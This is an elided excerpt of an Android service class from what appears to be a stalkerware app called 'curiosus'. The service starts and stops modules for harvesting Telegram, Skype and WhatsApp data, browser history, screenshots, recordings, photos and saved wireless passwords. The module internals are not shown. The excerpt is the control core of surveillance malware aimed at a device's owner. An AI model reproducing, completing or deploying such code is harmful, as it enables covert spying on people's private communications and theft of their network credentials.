package com.hyadesinc.curiosus.services;
...
import com.hyadesinc.curiosus.ThreadManager;
import com.hyadesinc.curiosus.modules.DeviceInfoModule;
import com.hyadesinc.curiosus.modules.PhotoModule;
import com.hyadesinc.curiosus.modules.RecorderModule;
import com.hyadesinc.curiosus.modules.SkypeModule;
import com.hyadesinc.curiosus.modules.TelegramModule;
import com.hyadesinc.curiosus.modules.UpdateModule;
import com.hyadesinc.curiosus.modules.WirelessPasswordModule;
...
import com.hyadesinc.curiosus.modules.BrowserHistoryModule;
import com.hyadesinc.curiosus.modules.CameraModule;
import com.hyadesinc.curiosus.modules.GCMModule;
import com.hyadesinc.curiosus.modules.ScreenshotModule;
import com.hyadesinc.curiosus.modules.WhatsAppModule;
...
public class AppService extends Service {
	...
	private TelegramModule mTelegramModule;
	private SkypeModule mSkypeModule;
    private UpdateModule mUpdateModule;
    private GCMModule mGcmModule;
    private CameraModule mCameraModule;
    private WirelessPasswordModule mWirelessPasswordModule;
	...
	private void startModules(){
		...
		mTelegramModule = new TelegramModule(this);
		mTelegramModule.start();

        mSkypeModule = new SkypeModule(this);
        mSkypeModule.start();

		//mCameraModule = new CameraModule(this);
		//mCameraModule.start();

        mWirelessPasswordModule = new WirelessPasswordModule(this);
        mWirelessPasswordModule.start();
	...
	private void stopModules(){
		...
		if (mTelegramModule != null) {
			mTelegramModule.dispose();
			mTelegramModule = null;
		}

        if (mSkypeModule != null) {
            mSkypeModule.dispose();
            mSkypeModule = null;
        }
        ...
        if (mWirelessPasswordModule != null) {
            mWirelessPasswordModule.dispose();
            mWirelessPasswordModule = null;
        }
